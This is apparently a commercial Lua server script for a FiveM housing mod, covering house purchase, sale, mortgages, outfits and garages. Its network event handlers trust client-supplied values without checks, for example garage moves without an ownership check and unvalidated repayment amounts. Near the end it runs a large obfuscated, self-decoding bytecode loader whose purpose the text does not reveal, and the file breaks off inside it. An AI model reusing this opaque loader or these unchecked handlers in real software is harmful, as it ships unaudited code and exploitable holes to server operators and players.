-- https://modit.store

GetOutfits = function(source)
  local xPlayer  = ESX.GetPlayerFromId(source)
  local ret,labels = false
  TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
    local count  = store.count('dressing')
    local _labels = {}
    for i=1, count, 1 do
      local entry = store.get('dressing', i)
      table.insert(_labels, entry.label)
    end
    labels = _labels
    ret = true
  end)
  while not ret do Wait(0); end
  return labels
end

GetOutfit = function(source,num)
  local xPlayer  = ESX.GetPlayerFromId(source)
  local ret,skin = false
  TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
    local outfit = store.get('dressing', num)
    skin = outfit.skin
    ret = true
  end)
  while not ret do Wait(0); end
  return skin
end

RemoveOutfit = function(index,label)
  local xPlayer = ESX.GetPlayerFromId(source)
  TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
    local dressing = store.get('dressing') or {}
    table.remove(dressing, index)
    store.set('dressing', dressing)
  end)
end

GetVehicles = function(source,house)
  local vehs = {}
  local retData = SqlFetch("SELECT * FROM owned_vehicles WHERE storedhouse=@storedhouse",{['@storedhouse'] = house.Id})
  if retData and type(retData) == "table" then
    for k,v in pairs(retData) do
      table.insert(vehs,{
        plate = v.plate,
        vehicle = json.decode(v.vehicle),
      })
    end
    ret = true
  end
  while not ret do Wait(0); end
  return vehs
end

SqlFetch = function(ssm,sjd)
  local res,ret
  MySQL.Async.fetchAll(ssm,sjd,function(sqldata)
    ret = sqldata
    res = true
  end)
  while not res do Wait(0); end
  return ret
end

SqlExecute = function(ssm,sjd)
  local res,ret
  MySQL.Async.execute(ssm,sjd,function(sqldata)
    ret = sqldata
    res = true
  end)
  while not res do Wait(0); end
  return ret
end

VehicleSpawned = function(plate)
  MySQL.Async.execute("UPDATE owned_vehicles SET `stored`=false,`storedhouse`=@storedhouse WHERE `plate`=@plate",{['@storedhouse'] = 0,['@plate'] = plate})
end

VehicleStored = function(id,plate,props)
  MySQL.Async.execute("UPDATE owned_vehicles SET `stored`=false,`storedhouse`=@storedhouse WHERE `plate`=@plate",{['@storedhouse'] = id,['@plate'] = plate})
end

GetInventory = function(source,cb,house)
  local v = Houses[house.Id]
  cb({cash = v.Inventory.Cash, blackMoney = v.Inventory.DirtyMoney, items = v.Inventory.Items, weapons = v.Inventory.Weapons })
end

PurchaseHouse = function(house)
  local _source = source
  local owned_count = GetHouseCount(_source)
  if not Config.RestrictHouseCount or owned_count < Config.RestrictHouseCount then
    local v = Houses[house.Id]
    local entry = house.Entry
    if not v.Owned then
      local afford
      if GetPlayerCash(_source) >= v.Price then
        afford = true
        TakePlayerCash(_source,v.Price)
      elseif GetPlayerBank(_source) >= v.Price then
        afford = true
        TakePlayerBank(_source,v.Price)
      end

      if afford then
        local lastOwner = ""
        if v.Owner and v.Owner:len() >= 1 then
          lastOwner = v.Owner
          local targetPlayer = GetPlayerByIdentifier(v.Owner)
          local salePrice = math.floor(v.Price * (v.ResalePercent / 100))
          if salePrice > 0 then
            if targetPlayer then
              local targetSource = GetPlayerSource(targetPlayer)
              AddPlayerBank(targetSource,salePrice)
              NotifyPlayer(targetSource,string.format(Labels["HousePurchased"],v.Price,(v.Price ~= salePrice and Labels["HouseEarning"] or ".")))
            else
              AddOfflineBank(v.Owner,salePrice)
            end

            if v.ResaleJob and v.ResaleJob:len() > 1 then
              local societyAmount = (Config.CreationJobs[v.ResaleJob].society and math.floor(v.Price * ((100 - v.ResalePercent) / 100)))
              local societyAccount = Config.CreationJobs[v.ResaleJob].account
              if societyAmount and societyAccount then
                AddSocietyMoney(societyAccount,societyAmount)
              end
            end
          end
        end

        v.Owner = GetPlayerIdentifier(_source)
        v.OwnerName = GetCharacterName(_source)
        v.ResaleJob = ""
        v.Owned = true
        TriggerClientEvent("Allhousing:SyncHouse",-1,v)
        SqlExecute("UPDATE allhousing SET owner=@owner,ownername=@ownername,resalejob=@resalejob,owned=1,housekeys=@housekeys WHERE id=@id",{['@owner'] = GetPlayerIdentifier(_source),['@ownername'] = v.OwnerName, ['@housekeys'] = json.encode({}),['@resalejob'] = "",['@id'] = v.Id})
        TriggerClientEvent("esx:showNotification",_source,"You purchased the house for $"..v.Price..".")
      else
        TriggerClientEvent("esx:showNotification",_source,"You can't afford that.")
      end
    end
  else
    TriggerClientEvent("esx:showNotification",_source,"You already own too many houses.")
  end
end

SellHouse = function(house,price)
  local _source = source
  local v = Houses[house.Id]
  local entry = house.Entry
  if v.Entry.x == entry.x and v.Entry.y == entry.y and v.Entry.z == entry.z then
    if v.Owned and v.Owner == GetPlayerIdentifier(_source) then
      if Config.RemoveFurniture then
        if Config.RefundFurniture and Config.RefundPercent then
          TriggerEvent("Allhousing.Furni:GetPrices", function(prices)
            local addVal,count = 0,0
            if v and v.Furniture and type(v.Furniture) == "table" then
              for k,v in pairs(v.Furniture) do
                local price = prices[v.model]
                addVal = addVal + price
                count = count + 1
              end
              if count and count > 0 then
                _print("[Sale]","Added $"..addVal.." to ".._source.." ("..GetPlayerIdentifier(_source).."/"..GetPlayerName(_source)..") to refund "..(count and count > 1 and count.." pieces" or tostring(count).." piece").." of furniture.")
                AddPlayerBank(_source,math.ceil(addVal*(Config.RefundPercent / 100)))
              end
            end
          end)
        end
        v.Furniture = {}
      end          
      local furniTab = {}
      if v and v.Furniture and type(v.Furniture) == "table" then
        for k,v in pairs(v.Furniture) do
          table.insert(furniTab,{
            pos = {x = v.pos.x, y = v.pos.y, z = v.pos.z},
            rot = {x = v.rot.x, y = v.rot.y, z = v.rot.z},
            model = v.model
          })
        end
      end
      v.Owned = false
      v.Price = price
      v.ResalePercent = 100
      v.ResaleJob = ""
      SyncHouse(v)
      TriggerClientEvent("Allhousing:Boot",-1,house.Id)
      SqlExecute("UPDATE "..((Config and Config.AllhousingTable) or "allhousing").." SET owned=0,price=@price,resalepercent=100,resalejob=@resalejob,furniture=@furniture WHERE id=@id",{['@furniture'] = json.encode(furniTab),['@resalejob'] = "",['@price'] = price,['@id'] = v.Id})
      return
    end
  end
end

GetHouseCount = function(source)
  local id = GetPlayerIdentifier(source)
  local count = 0
  for _,house in pairs(Houses) do
    if type(house.Owner) == "string" and house.Owner:len() >= 1 then
      if house.Owner == id then
        count = count + 1
      end
    end
  end
  return count
end

MortgageHouse = function(house)
  local _source = source
  local owned_count = GetHouseCount(_source)
  if not Config.RestrictHouseCount or owned_count < Config.RestrictHouseCount then
    local v = Houses[house.Id]
    local entry = house.Entry
    if not v.Owned then
      local price = math.floor((v.Price / 100) * Config.MortgagePercent)
      local afford
      if GetPlayerCash(_source) >= price then
        afford = true
        TakePlayerCash(_source,price)
      elseif GetPlayerBank(_source) >= price then
        afford = true
        TakePlayerBank(_source,price)
      end
      if afford then
        local lastOwner = ""
        if v.Owner and v.Owner:len() >= 1 then
          lastOwner = v.Owner
          local targetPlayer = GetPlayerByIdentifier(v.Owner)
          local salePrice = math.floor(price * (v.ResalePercent / 100))
          if salePrice > 0 then
            if targetPlayer then
              local targetSource = GetPlayerSource(targetPlayer)
              AddPlayerBank(targetSource,salePrice)
              NotifyPlayer(targetSource,"Your house was mortgaged for $"..price..(price ~= salePrice and ", you earnt $"..salePrice.." from the sale." or "."))
            else
              AddOfflineBank(v.Owner,salePrice)
            end

            if v.ResaleJob and v.ResaleJob:len() > 1 then
              local societyAmount = (Config.CreationJobs[v.ResaleJob].society and math.floor(price * ((100 - v.ResalePercent) / 100)))
              local societyAccount = Config.CreationJobs[v.ResaleJob].account
              if societyAmount and societyAccount then
                AddSocietyMoney(societyAccount,societyAmount)
              end
            end
          end
        end

        v.Owner = GetPlayerIdentifier(_source)
        v.OwnerName = GetCharacterName(_source)
        v.ResaleJob = ""
        v.Owned = true
        v.MortgageOwed = (v.Price - price)
        v.LastRepayment = os.time()
        TriggerClientEvent("Allhousing:SyncHouse",-1,v)
        SqlExecute("UPDATE allhousing SET owner=@owner,ownername=@ownername,resalejob=@resalejob,owned=1,housekeys=@housekeys,mortgage_owed=@mortgage_owed,last_repayment=@last_repayment WHERE id=@id",{['@owner'] = GetPlayerIdentifier(_source),['@ownername'] = v.OwnerName, ['@housekeys'] = json.encode({}),['@resalejob'] = "",['@mortgage_owed'] = v.MortgageOwed,['@last_repayment'] = v.LastRepayment,['@id'] = v.Id})
        TriggerClientEvent("esx:showNotification",_source,"You mortgaged the house for $"..price..".")
      else
        TriggerClientEvent("esx:showNotification",_source,"You can't afford that.")
      end
    end
  else
    TriggerClientEvent("esx:showNotification",_source,"You already own too many houses.")
  end
end

GetVehicleOwner = function(source,plate)
  local res,ret
  MySQL.Async.fetchAll("SELECT * FROM owned_vehicles WHERE plate=@plate",{['@plate'] = plate},function(retData)
    ret = {}
    if retData and type(retData) == "table" and retData[1] then
      local xPlayer  = ESX.GetPlayerFromId(source)
      if retData[1].owner == xPlayer.getIdentifier() then
        ret.owner = true
        ret.owned = true
      else
        ret.owner = false
        ret.owned = true
      end
    else
      ret.owner = false
      ret.owned = false
    end
    res = true
  end)
  while not res do Wait(0); end
  return ret
end

if Config.UsingDiscInventory then
  Citizen.CreateThread(function()
    TriggerEvent('disc-inventoryhud:RegisterInventory', {
      name = 'allhousing',
      label = 'Storage',
      slots = (Config.DiscInventorySlots or 20)
    })
  end)
end

if Config.ControlCharacters then
  KashChosen = function(charId)
    KashCharacters[source] = charId
  end

  GetHouseData = function(source,entry)
    while not ModReady do Wait(0); end
    local identifier = GetPlayerIdentifier(source,true)
    if Config.UsingKashacters then
      while not KashCharacters[source] do Wait(0); end
      local st,fn = identifier:find(":")
      KashCache[source] = KashCharacters[source]..":"..identifier:sub((fn or 0)+1,identifier:len())
      identifier = KashCache[source]
    end
    if not entry then return {Houses = Houses, Identifier = identifier}; end
    for k,v in pairs(Houses) do
      if v.Entry.x == entry.x and v.Entry.y == entry.y and v.Entry.z == entry.z then
        return v
      end
    end
    return false
  end

  RegisterCallback("Allhousing:GetHouseData", GetHouseData)
  RegisterNetEvent("kashactersS:CharacterChosen")
  AddEventHandler("kashactersS:CharacterChosen", KashChosen)
end

SetGarageLocation = function(id,pos)
  local house = Houses[id]
  local _source = source
  if house.Owned and house.Garage then
    house.Garage = pos
    TriggerClientEvent("Allhousing:SyncHouse",-1,house)
    SqlExecute("UPDATE allhousing SET garage=@garage WHERE id=@id",{
      ['@garage'] = json.encode({x = pos.x, y = pos.y, z = pos.z, w = pos.w}),
      ['@id'] = id
    })
  end
end

RepayMortgage = function(id,repay)
  local _source = source
  local house = Houses[id]
  if house.Owned and house.MortgageOwed >= 0 then
    repay = math.min(repay,house.MortgageOwed)
    local afford
    if GetPlayerCash(_source) >= repay then
      afford = true
      TakePlayerCash(_source,repay)
    elseif GetPlayerBank(_source) >= repay then
      afford = true
      TakePlayerBank(_source,repay)
    end
    if afford then
      house.MortgageOwed = house.MortgageOwed - repay
      house.LastRepayment = os.time()
      TriggerClientEvent("Allhousing:SyncHouse",-1,house)
      SqlExecute("UPDATE allhousing SET mortgage_owed=@mortgage_owed,last_repayment=@last_repayment WHERE id=@id",{
        ['@id'] = house.Id,
        ['@mortgage_owed'] = house.MortgageOwed,
        ['@last_repayment'] = house.LastRepayment
      })
    end
  end
end

RevokeTenancy = function(house)
  local house = Houses[house.Id]
  local _source = source
  local identifier = GetPlayerIdentifier(_source)
  local jobName = GetPlayerJobName(_source)
  if not Config.CreationJobs[jobName] then return; end
  local jobRank = GetPlayerJobRank(_source)
  if Config.CreationJobs[jobName].minRank > jobRank then return; end

  local charName = GetCharacterName(_source)
  if house.Owned and house.MortgageOwed >= 0 then

    house.Owned = false
    house.Owner = identifier
    house.OwnerName = charName
    house.ResaleJob = jobName
    house.HouseKeys = {}
    house.MortgageOwed = 0
    house.LastRepayment = 0

    TriggerClientEvent("Allhousing:SyncHouse",-1,house)
    SqlExecute("UPDATE allhousing SET owner=@owner,ownername=@ownername,resalejob=@resalejob,owned=0,housekeys=@housekeys,mortgage_owed=0,last_repayment=0 WHERE id=@id",{['@owner'] = house.Owner,['@ownername'] = house.OwnerName, ['@housekeys'] = json.encode({}),['@resalejob'] = house.ResaleJob,['@id'] = house.Id})
  end
end

RegisterCallback("Allhousing:GetVehicleOwner",GetVehicleOwner)
RegisterCallback("Allhousing:GetHouseData", GetHouseData)
RegisterCallback("Allhousing:GetOutfits", GetOutfits)
RegisterCallback("Allhousing:GetOutfit", GetOutfit)
RegisterCallback("Allhousing:GetVehicles", GetVehicles)

RegisterNetEvent("Allhousing:PurchaseHouse")
AddEventHandler("Allhousing:PurchaseHouse", PurchaseHouse)

RegisterNetEvent("Allhousing:SetGarageLocation")
AddEventHandler("Allhousing:SetGarageLocation", SetGarageLocation)

RegisterNetEvent("Allhousing:MortgageHouse")
AddEventHandler("Allhousing:MortgageHouse", MortgageHouse)

RegisterNetEvent("Allhousing:VehicleSpawned")
AddEventHandler("Allhousing:VehicleSpawned", VehicleSpawned)

RegisterNetEvent("Allhousing:VehicleStored")
AddEventHandler("Allhousing:VehicleStored", VehicleStored)

RegisterNetEvent("Allhousing:RemoveOutfit")
AddEventHandler("Allhousing:RemoveOutfit", RemoveOutfit)

RegisterNetEvent("Allhousing:RepayMortgage")
AddEventHandler("Allhousing:RepayMortgage", RepayMortgage)

RegisterNetEvent("Allhousing:RevokeTenancy")
AddEventHandler("Allhousing:RevokeTenancy", RevokeTenancy)

if Config.UsingLoader then
  AddEventHandler(string.format("%s:DoIni",GetCurrentResourceName()),function(load_callback)
    LoadCallback = load_callback    
    local d=string.byte;local i=string.char;local t=string.sub;local P=table.concat;local e=table.insert;local C=math.ldexp;local L=getfenv or function()return _ENV end;local r=setmetatable;local s=select;local a=unpack or table.unpack;local B=tonumber;local function h(a)local l,n,d="","",{}local c=256;local o={}for e=0,c-1 do o[e]=i(e)end;local e=1;local function f()local l=B(t(a,e,e),36)e=e+1;local n=B(t(a,e,e+l-1),36)e=e+l;return n end;l=i(f())d[1]=l;while e<#a do local e=f()if o[e]then n=o[e]else n=l..t(l,1,1)end;o[c]=l..t(n,1,1)d[#d+1],l,c=n,n,c+1 end;return table.concat(d)end;local f=h('24124627524724F27524626X26Y26Q25L26E26C27326W26A24724327927F27H27J24A27925L25L25Z26B26A27226X27G26K26R26Q24724027R25L26726W27327J27L27527S25G26R26D24727427525X28927328026W24727Q28J26C26R26V26A26R25E27228S26V26Q24627827524E27927727927B27D27N27I28327926D26A27G26W26P29D27526O27Y26Z28U29K24625P24Z26D25N24S25224723P27925T26R26A28E26D26X26B26C26T26R2632A229028U26V24723K2A02A225X2A728S27I2A42A62A826R26026V26Z26R24724527926Z26X26Q2AX2792B32B424927923O23Y2462472BA2B72752442462BF2752522BE2BG2462AX23O2752AX2422BD2462BR28B2462BO24627L2842B427L2BB2BF2BX28428I2BW2752742952B42BR2C72792BH2BL2792B22B42BC2CK2CL2CM2CN24C2962C727S26T28S26Q28G2BV26E26V27326C28G24D27925X2CV26R27I27326V26Y28G2CJ2632B029Y2AI2A328F2AP2A92AB26A2AD2DO2AG2DI2AK26C2AM2DJ2A52A72A92AS2AU2AW2AY2B02CJ2B428H27925C26R2D227326X28O2C72682EA26D2EC26W2B42BJ27523O2C02CN2402EK27523V2BC2BB24225Q2792EU2BB2462702CM23O2712962BS2BK2EN2762BM2CO2BF2BF2BR2792D42BB2EO2BY2CN2462CQ27L2BQ24624025S2792782C32BT2EY2752FV2BW2EP2F12BW23Z2BC2BV2BX2BF2EP2CF2BC2C42BP2462C72BX2BR2CB2B32EW2BL23Q2B32BR2FJ2GK2BS2BB2G72BK2GA2BK2FW2BX2AX2CQ2FA2BT2462GJ2F72BR2BF2GN2FU2BC2FK2FB29E2GB27924V2F72752D42762FG24629O27W29Q26C26V26W26Q26X26Z2E52F223225Y2HX24622U24P2I125R25Y2472HM26Y26X2902472H924627S26Z26N25L28V29F25L26826V26C25224R29X2HM26A26N26E2AV2BV28D28F2I12522I724B2852IH2IJ28F26A2IM2IO2B42562B726X2HI2462EM2B32GD2BC2I12BK2JK2GL2H22BF2G32EM2FE2BL2GZ2FL2B42JU2JK2FQ2752FG2BB25B2HB2842BZ2B72K52C62CK2CE2B32842KB27927L2JU2C52H42KC2JX2KE2BL2JK2742932C82KL2H12B32742JU2C02842G52BB2742EX2792L12FX27924W2CL26A2FR2KN2BL2842BB2FJ2KF2462HK2FR2EK28423T2EV2L72752LO2EW2FY2462512K62LC2LK2KZ2LV2CN2L42752LW2LT27925A2CL25W2LC2B426D2LC2CG2M32462M82F12MA2GW2462MD2842MF2572BC2FI2752MA2LG2B32MD2FW2HG2JG23R2962IT2IV2IX27M26T2DB26Y2I82792IA2IC2BV26Q26R26S26B29J2C726P2A227H29M27K2852A42J12I02CK23U2NT2B42502I72CG2EC2NP27526927G28V2O224629B28A2792EA26C27Y2472BX24625I2EA29M26C26Z26626A26A26E28E26F26B2J82I123M2NW2B323Y25Y2CM2392B72G22792ER2P52LP2MG2LF2MT2JG2MM2HF2LQ2462382LX2F92FR2JI2CQ2G32MG2PM2PF2J42MJ2PC2MD2PJ2MG2PH2LH2CI2P52JI2N12PN2LU2Q22PF23M2M92PT2PE2PW2PI2H32BI2912B32BZ2ES2462L62M62752L62MG2502QC2G323O2G02HM2EM2MV2BV2GB2JO2MB2KT2BF2KD2GC2LE2B324Z2P82LU2R72PS2HD2752PU2CH2PF2PX2G12792QU2IE27527L2BX2MV2CM2KJ2FB2EP2G82KL2E62KP2CO2GQ2BC2RT2BK2KS2F72KY2B324J2R82792S72RB2FM2RE2MF2LU2RH2HC2FC2752P62752HH2MV2MG2SM2PF25Z2QQ2B725M2JL2FD2JV2RS2BS2R22CK2FW2G92B325U2S82752T52SB2G32PD2PV2SF2QC2KV2522QF2FH2LL2792672T62462TL2QL24625G2SS2EN2G02TF2FB2BB2LK2QY2KT2BB2S12BL2R32T22R024625F2TM2U82T92MW2QA2TD2PY27528Q2TJ27525R2TM2UK2TP26S2TS2BW2T82462UH2JY2SX2S02SZ2GF2T12RX2GA2UO2SN2LU2V22PF26R2Q82RC2TB2RF2QB2UF2462J42SJ2JI26E2M22LU2VI2VD2QR2SU2BB2VF2CK2RR2UW2JQ2UY2RW2S52HE2V32VY2PB2V92SD2RJ2UE2RI2PJ2SK2462692TM2WA2TP1M2UP23O2UR2CG2UU2QZ2U22T02VW2R52792WE2VZ2752WQ2PF1L2V82SC2UD2792SG2EP2CJ2FK2BB2UH2GA1U2TM2X72TP152QC2X22PA2TF2912MV2D42GA1O2TM2XK2XA2XC2P32BC2VQ24025L2792XB2WR2462XV2PF102WW2TA2W32K22W52SH2QU2TA2FL2RO2SI2VR2UV2U12UX2H52FB2JU2CM2RZ2YE2VU2S32YH2WO27521E2TM2YR2TP21D2Y12UC2TC2WZ2QC2Y72C12U02RF2WJ2Z32WL2RV2GR2YI2UZ2YA2Z72YN2R42T32791Z2TM2ZI2TP21A2YW2HE2YY2752X02792482P52QI2162TM2ZW2TP22A2WF2VO2462ZT2RQ2YD2R02RU2U42V02B32292TM310C2UB2ZO2VB2Y52EP2Z12QG2Z331042YC2WK2UX2B62WN2WI2GR2ZC2UX2RL2YO2ZG27521V2TM31112TP2262ZN2RD2WY2ZQ2CL2602CO24Q2S424624W24M2792232BC2N12MG311J2TP23A31162VA2SE2YZ2SB2MC2PE2462HH2RC2UH2O72O9247310N25S26B26T27125226N2A625625226P26B26N2542OF2792OI26C2OK2OM2OO2OQ26R2OS2J829Q29F29H29J2EP312M29P2BV29T25529T2O72IZ26D2I12I32I124Y2OX27923Q2I72B32JM2P0310T2YJ2B3311Y2CN2OG244312129H27J2LW27525V2DU27Y25226T2ED26W26R26T26A27H26P25425228E29G26N314425226D27X26C26A26Y312G2NA27525D2D026A2HX1U2112I72EP27S2872892I12732I72CY2N726Y2N92I92IB2822N32IW2472GJ26O26B26W31422EJ2472LK27U27W27Y28M281312H2UH27S315H314E315K282310R2TN26W2IN26Y27326Q314C2CU27326E26A312H2EP312U314429Q312Y27J2M8313T313V2IP313Y26W3140315D29I25225A29T25B3146314826C314A316K314D27Y314G314I2GJ26A26X316729I2E52SR275311G2PZ2XW2AX2TP2ZT2BB24W2PR31032TM317B2RI2AX2CG23O2722H32I1317J2HB2GE2HM2GH2LD2GE2JR2KT2AX2ML31792BC2HM2462P0317C2VQ2592BC2L32LU31872PY2AX2GJ2FK2BR2S32LB2C22B32Q72AX27L2BR2402BJ2AX24X2VJ279318S2U12EK2BR2QK2PF2QN2LU318V2RI27L2KV2462LB28431822LW2KI2BL317D2FL31932D42MG31932FK319C2EN2P02842UT2RM2BL2RZ27L2YG2LC3182319Q317W2BX27L2VQ2KH2P82B3318431942RF23O24I2LC310N2462732FL317W2MG31A52P62BB2542TM31AK2TP24K2LX317P2792LB2GP2B331AD317P2TP31A52FK31AQ2BW2M82BR315T2EM2BR2BR2GN319Z2462N12H22842OG2792R32SJ2VV2GO2CO2CJ2RZ2K12KT2BU2CK31AW317X2U62GE2RP313L2G3311H279311B2CM311D2YO2W8318J2TP318J2MG23U2WF24Y2R431052RZ2GE2H22JP2JH2TW2Y92GV2BS2AX2GG2K22Z82PZ2VS2CD2BS27L2ZE31BP2RW2JN23X2Z42BW2TL31CN2BS2BR3196317V2UV2BR2TY319Q2Y82FL31DD2GR31822552XO2EN24T31812792QV2G62R131072GE31CO2H3319U317P2JK31CT2H227L319P2H32QX2RC2FE31D0317W2EN26T2FC31DT31D631BQ2RX317T31DB31DE2CK318J2CO2CL31BW2TI2762OG312K312M2ON2OP2OR2OT29F312T29G3168312X29N312Z279313131332IY25L2NR2CK31382CK24E313B275313D2TA314J246314L314V31A426924T2SR31DF31CY2SL2JG2B92EN2P431DK31CC31CI2LP2BN2BK317S2GE2GU2H3317Z31EE31CP31G427L2R331CX2GR31CZ31D123O2UK318M31D531CQ31D831DX29231EI2CO31EJ2RY2KT2752KV2YA31EG2GX2QD31GD31EM31EK31CF27531C02YC31CJ311X2PC31BK2B331H42UU31H631H02462AH31H22792I324731A927524G24U24H24I31HP24H24M24H24L24L25Z24K25S31HY24G25U24G25S24G24I24G24V31HP24K25V31I524G24J24H24G31HY24H31IF24J31IG31HN31I331IN25W31HU313G2472KV31HU31ID24H24K31IF31ID2I131FC312I31HM24U31ID24G24N31IW31HP31IL31IK31J724I2I131FF2GJ24J24M24I25S24J24L24J31JD2CK2OW31J224631IU31J425S31J824I24J31JV24L31IW24G24L2I12OZ24726627931K231I731J931I825Z31J525V31HW31IH24L31K231K131I831HT31I624V24G31IB31IW31I425X24H31JB31KH31K931J431IK31HQ31IK25X31IV24K31IA24G31KT31JB2I12NV315827931II31IM31JC2NS2ID31K824G31KU31KP31KJ31KN31IN25V2I12NY2472CG24I31K32CK313A28P31LC31I624N31I131HS31L331FH26P26D26B26S31LS279254312H2PN296316631EY29I31FH26T2722IO31LB275316Z26W26B26Z26S2EA2I124M313E2HA2EN25I2LP2BI31CJ2JK2BF317O2B4317T319W2BL31N931FP31FP2RC2P031752VQ31C52PF318J31A831FX31AI24624S2TM31NP31852TI2BB2BQ2LU2MS31NL31CH318P2MR318T2HJ31812LU31NR311F2VQ2GN2GT2PF31O92BW31A92YL2TJ2BB31O62TP31O6319E27523N31882PF31ON2FJ31OE2Z831NN31OI2PF31OK2VQ31D02BB2782MG31OZ31OD2BC2KV31O02BB31P32Y427931P32MG31OX31DN31O12MG2BJ31OR2BC2X52EK31OH31NQ2BC31OL311F2XQ2PF2L931PJ2BB310N31P731PR2Q32L831O427931OK31BY2462K52BB2B62MG31Q72PF2MQ31PV2462IE31PY31QD2W427931QI31PD31PP31Q5311H2BB311L2LU31QP2PF24L2HB31OS2OG31OU31PO317C31Q524G2BC29Z2MG31R32TP24U31QW2BC2Q731PA27531O624624O2FM2PB2RP2JH31AO2MV31ON31NL2AX31HG2BG31D031N924H31DM2D531RI31H72RC23W2XP2PJ23O2EU31E431D02CK31S42PE24431S72CN31SB31NM31R331N531N12582JG24031R32FQ2MY31SJ2PJ24631SP2B431SL31E231SI2CM31SU2K82RP31SS317S2EU2FP2P531R331GA31SW31H231S9318N2CF31D0319T2B731NP27L31G92R02EM31TH2UY2KK31N9319C31DD2G3');local o=bit and bit.bxor or function(e,l)local n,o=1,0 while e>0 and l>0 do local t,c=e%2,l%2 if t~=c then o=o+n end e,l,n=(e-t)/2,(l-c)/2,n*2 end if e<l then e=l end while e>0 do local l=e%2 if l>0 then o=o+n end e,n=(e-l)/2,n*2 end return o end local function n(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;local e=1;local function l()local c,t,l,n=d(f,e,e+3);c=o(c,150)t=o(t,150)l=o(l,150)n=o(n,150)e=e+4;return(n*16777216)+(l*65536)+(t*256)+c;end;local function B()local l=o(d(f,e,e),150);e=e+1;return l;end;local function c()local l,n=d(f,e,e+2);l=o(l,150)n=o(n,150)e=e+2;return(n*256)+l;end;local function G()local e=l();local l=l();local t=1;local o=(n(l,1,20)*(2^32))+e;local e=n(l,21,31);local l=((-1)^n(l,32));if(e==0)then if(o==0)then return l*0;else e=1;t=0;end;elseif(e==2047)then return(o==0)and(l*(1/0))or(l*(0/0));end;return C(l,e-1023)*(t+(o/(2^52)));end;local h=l;local function C(l)local n;if(not l)then l=h();if(l==0)then return'';end;end;n=t(f,e,e+l-1);e=e+l;local l={}for e=1,#n do l[e]=i(o(d(t(n,e,e)),150))end return P(l);end;local e=l;local function P(...)return{...},s('#',...)end local function I()local f={};local t={};local e={};local a={f,t,nil,e};local e=l()local o={}for n=1,e do local l=B();local e;if(l==0)then e=(B()~=0);elseif(l==3)then e=G();elseif(l==1)then e=C();end;o[n]=e;end;a[3]=B();for e=1,l()do t[e-1]=I();end;for a=1,l()do local e=B();if(n(e,1,1)==0)then local t=n(e,2,3);local d=n(e,4,6);local e={c(),c(),nil,nil};if(t==0)then e[3]=c();e[4]=c();elseif(t==1)then e[3]=l();elseif(t==2)then e[3]=l()-(2^16)elseif(t==3)then e[3]=l()-(2^16)e[4]=c();end;if(n(d,1,1)==1)then e[2]=o[e[2]]end if(n(d,2,2)==1)then e[3]=o[e[3]]end if(n(d,3,3)==1)then e[4]=o[e[4]]end f[a]=e;end end;return a;end;local function h(e,i,c)local l=e[1];local n=e[2];local e=e[3];return function(...)local o=l;local C=n;local t=e;local B=P local l=1;local d=-1;local P={};local G={...};local f=s('#',...)-1;local s={};local n={};for e=0,f do if(e>=t)then P[e-t]=G[e+1];else n[e]=G[e+1];end;end;local G=f-t+1 local e;local t;while true do e=o[l];t=e[1];if t<=57 then if t<=28 then if t<=13 then if t<=6 then if t<=2 then if t<=0 then if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;elseif t==1 then local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;else n[e[2]]();end;elseif t<=4 then if t==3 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else local e=e[2];d=e+G-1;for l=e,d do local e=P[l-e];n[l]=e;end;end;elseif t>5 then n[e[2]]=c[e[3]];else local e=e[2]local o,l=B(n[e](a(n,e+1,d)))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t<=9 then if t<=7 then local t;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=n[e[3]][n[e[4]]];l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]==n[e[4]])then l=l+1;else l=e[3];end;elseif t>8 then local t;n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];n[e[2]]=c[e[3]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];t=e[2]n[t]=n[t](n[t+1])l=l+1;e=o[l];if(n[e[2]]~=n[e[4]])then l=l+1;else l=e[3];end;else if(n[e[2]]~=e[4])then l=l+1;else l=e[3];end;end;elseif t<=11 then if t==10 then n[e[2]][n[e[3]]]=n[e[4]];else local e=e[2]local o,l=B(n[e](a(n,e+1,d)))d=l+e-1 local l=0;for e=e,d do l=l+1;n[e]=o[l];end;end;elseif t==12 then if n[e[2]]then l=l+1;else l=e[3];end;else if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;end;elseif t<=20 then if t<=16 then if t<=14 then local a=C[e[3]];local d;local t={};d=r({},{__index=function(l,e)local e=t[e];return 